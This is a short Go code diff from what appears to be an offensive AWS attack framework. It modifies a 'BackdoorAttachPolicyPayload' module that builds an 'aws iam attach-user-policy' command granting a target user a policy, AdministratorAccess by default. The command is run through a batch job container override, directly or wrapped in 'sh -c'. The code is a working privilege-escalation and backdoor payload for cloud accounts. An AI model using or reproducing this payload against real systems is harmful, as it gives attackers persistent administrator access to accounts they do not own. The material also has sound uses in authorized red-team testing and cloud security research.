@@ -66,9 +66,9 @@ func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error 
 	return nil
 }
 
-// GenerateCode returns the AWS CLI subcommand args (without the "aws" prefix) for use
-// as ContainerOverrides.Command. The batch job container's entrypoint is "aws", so the
-// module splits these args directly into []string — no "sh -c" wrapper needed or wanted.
+// GenerateCode returns a bash one-liner that attaches the policy.
+// The module wraps this as either direct args (aws-cli container mode) or
+// ["sh", "-c", code] (generic Linux container mode) depending on CONTAINER_RUNTIME.
 func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
 	targetUser := options["TARGET_USER"]
 	policyArn := options["POLICY_ARN"]
@@ -76,7 +76,7 @@ func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (s
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
 	}
 
-	return fmt.Sprintf("iam attach-user-policy --user-name %s --policy-arn %s", targetUser, policyArn), nil
+	return fmt.Sprintf("aws iam attach-user-policy --user-name %s --policy-arn %s", targetUser, policyArn), nil
 }
 
 // VerifySuccess confirms the policy attachment by listing the user's attached policies.
